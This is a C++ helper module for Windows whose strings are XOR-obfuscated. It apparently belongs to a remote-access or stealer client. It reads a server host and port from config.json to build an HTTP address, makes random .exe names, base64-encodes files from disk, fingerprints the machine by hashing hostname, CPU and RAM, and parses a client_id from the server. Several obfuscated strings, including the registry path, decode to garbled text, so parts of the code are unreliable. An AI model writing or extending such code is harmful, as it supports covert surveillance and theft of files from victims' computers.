#include "mt.h"

string __o(const char* s, int n) {
    string r;
    r.reserve(n);
    for (int i = 0; i < n; i++) r += s[i] ^ 0x55;
    return r;
}

wstring __ow(const wchar_t* s, int n) {
    wstring r;
    r.reserve(n);
    for (int i = 0; i < n; i++) r += wchar_t(s[i] ^ 0x55);
    return r;
}

void hB(const string& message) {
    if (yJ) {
        try {
            SYSTEMTIME st;
            GetLocalTime(&st);
            printf("[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
                   st.wYear, st.wMonth, st.wDay,
                   st.wHour, st.wMinute, st.wSecond,
                   message.c_str());
            fflush(stdout);
        } catch (...) {}
    }
}

string zR() {
    return __o("\x3d\x21\x21\x25\x6f\x7a\x7a",7) + yL + ":" + to_string(yM) + yK;
}

wstring zH() {
    wstring name;
    wstring chars = L"abcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < 5; i++) {
        name += chars[rand() % 36];
    }
    name += L".exe";
    return name;
}

bool yF() {
    ifstream fin(__o("\x36\x3a\x3b\x33\x3c\x32\x7b\x3f\x26\x3a\x3b",11));
    if (!fin.is_open()) {
        hB(__o("\x22\x34\x27\x3b\x3c\x3b\x32\x6f\x75\x36\x34\x3b\x3b\x3a\x21\x75\x3a\x25\x30\x3b\x75\x36\x3a\x3b\x33\x3c\x32\x7b\x3f\x26\x3a\x3b\x79\x75\x20\x26\x3c\x3b\x32\x75\x31\x30\x33\x34\x20\x39\x21\x26",48));
        return false;
    }
    string content((istreambuf_iterator<char>(fin)), istreambuf_iterator<char>());
    fin.close();

    auto find_json_str = [&](const string& key) -> string {
        size_t pos = content.find("\"" + key + "\"");
        if (pos == string::npos) return "";
        pos = content.find(":", pos);
        if (pos == string::npos) return "";
        pos = content.find("\"", pos);
        if (pos == string::npos) return "";
        size_t end = content.find("\"", pos + 1);
        if (end == string::npos) return "";
        return content.substr(pos + 1, end - pos - 1);
    };
    auto find_json_int = [&](const string& key, int def) -> int {
        size_t pos = content.find("\"" + key + "\"");
        if (pos == string::npos) return def;
        pos = content.find(":", pos);
        if (pos == string::npos) return def;
        pos = content.find_first_of(__o("\x65\x64\x67\x66\x61\x60\x63\x62\x6d\x6c",10), pos);
        if (pos == string::npos) return def;
        size_t end = content.find_first_not_of(__o("\x65\x64\x67\x66\x61\x60\x63\x62\x6d\x6c",10), pos);
        return atoi(content.substr(pos, end - pos).c_str());
    };
    auto find_json_bool = [&](const string& key, bool def) -> bool {
        size_t pos = content.find("\"" + key + "\"");
        if (pos == string::npos) return def;
        pos = content.find(":", pos);
        if (pos == string::npos) return def;
        pos = content.find_first_of("tf", pos);
        if (pos == string::npos) return def;
        return content.substr(pos, 4) == "true";
    };

    string host = find_json_str(__o("\x26\x30\x27\x23\x30\x27",6));
    if (!host.empty()) yL = host;
    int port = find_json_int(__o("\x25\x3a\x27\x21",4), 0);
    if (port > 0) yM = port;
    yJ = find_json_bool("console_log", true);

    hB(__o("\x36\x3a\x3b\x33\x3c\x32\x75\x39\x3a\x34\x31\x30\x31\x3a\x6f\x75",15) + yL + ":" + to_string(yM));
    return true;
}

string zX(const unsigned char* data, size_t len) {
    static const char* b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    string out;
    out.reserve((len + 2) / 3 * 4);
    for (size_t i = 0; i < len; i += 3) {
        unsigned int val = ((unsigned int)data[i]) << 16;
        if (i + 1 < len) val |= ((unsigned int)data[i + 1]) << 8;
        if (i + 2 < len) val |= data[i + 2];
        out += b[(val >> 18) & 0x3F];
        out += b[(val >> 12) & 0x3F];
        out += (i + 1 < len) ? b[(val >> 6) & 0x3F] : '=';
        out += (i + 2 < len) ? b[val & 0x3F] : '=';
    }
    return out;
}

string zK(const string& filepath) {
    ifstream fin(std::filesystem::path(yB(filepath)), ios::binary);
    if (!fin) return "";
    vector<unsigned char> buf((istreambuf_iterator<char>(fin)), istreambuf_iterator<char>());
    fin.close();
    return zX(buf.data(), buf.size());
}

string zY(const string& s) {
    string out;
    out.reserve(s.length() + 64);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if ((unsigned char)c < 0x20) {
                    char hex[7];
                    sprintf_s(hex, "\\u%04x", (unsigned char)c);
                    out += hex;
                } else {
                    out += c;
                }
            break;
        }
    }
    return out;
}

string zZ() {
    HKEY hKey;
    string cpu = __o("\x20\x3b\x3e\x3b\x3a\x22\x3b",7);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, __o("\x1d\x34\x27\x31\x22\x34\x27\x30\x5c\x1a\x10\x2e\x06\x18\x1f\x0c\x01\x1d\x1c\x01\x19\x5c\x10\x16\x21\x21\x30\x38\x5c\x36\x3a\x3b\x33\x3c\x32\x20\x27\x3a\x36\x30\x26\x3a\x27\x5c\x31\x30\x27\x3c\x3b\x32\x34\x27\x0c\x5c\x11\x5c\x16\x5c\x17\x5c\x20\x5c\x21\x5c\x22\x5c\x23\x5c\x24\x5c\x25\x5c\x26\x5c\x27\x5c\x28\x5c\x29\x5c\x30\x5c\x31\x5c\x32\x5c\x33\x5c\x34\x5c\x35\x5c\x36\x5c\x37\x5c\x38\x5c\x39\x5c\x3a\x5c\x3b\x5c\x3c\x5c\x3d\x5c\x3e\x5c\x3f\x5c\x40\x5c\x41\x5c\x42\x5c\x43\x5c\x44\x5c\x45\x5c\x46\x5c\x47\x5c\x48\x5c\x49",132).c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buf[256] = {};
        DWORD size = sizeof(buf);
        if (RegQueryValueExA(hKey, __o("\x1b\x27\x3a\x36\x30\x26\x26\x3a\x27\x1b\x34\x38\x30\x26\x34\x0a\x21\x3c\x27\x3c\x3b\x32\x10\x18\x18\x18",26).c_str(), NULL, NULL, (LPBYTE)buf, &size) == ERROR_SUCCESS)
            cpu = string(buf);
        RegCloseKey(hKey);
    }
    return cpu;
}

DWORD yE() {
    MEMORYSTATUSEX ms = { sizeof(ms) };
    if (GlobalMemoryStatusEx(&ms))
        return (DWORD)(ms.ullTotalPhys / (1024 * 1024));
    return 0;
}

string zW(const string& hostname, const string& cpu, DWORD ramMB) {
    string input = hostname + "|" + cpu + "|" + to_string(ramMB);
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE hash[20] = {};
    DWORD hashLen = 20;
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        if (CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
            CryptHashData(hHash, (BYTE*)input.c_str(), (DWORD)input.length(), 0);
            CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    char hex[3];
    string result;
    for (DWORD i = 0; i < hashLen; i++) {
        sprintf_s(hex, "%02x", hash[i]);
        result += hex;
    }
    return result;
}

string zJ(const string& json) {
    size_t pos = json.find("\"client_id\":\"");
    if (pos != string::npos) {
        pos += 13;
        size_t endPos = json.find("\"", pos);
        if (endPos != string::npos)
            return json.substr(pos, endPos - pos);
    }
    return "";
}

string yC(const wstring& wstr) {
    if (wstr.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    string result(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &result[0], len, NULL, NULL);
    return result;
}

wstring yB(const string& str) {
    if (str.empty()) return L"";
    int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
    wstring result(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &result[0], len);
    return result;
}

string yA(const string& oem) {
    if (oem.empty()) return "";
    int len = MultiByteToWideChar(CP_OEMCP, 0, oem.c_str(), (int)oem.size(), NULL, 0);
    wstring wstr(len, 0);
    MultiByteToWideChar(CP_OEMCP, 0, oem.c_str(), (int)oem.size(), &wstr[0], len);
    return yC(wstr);
}
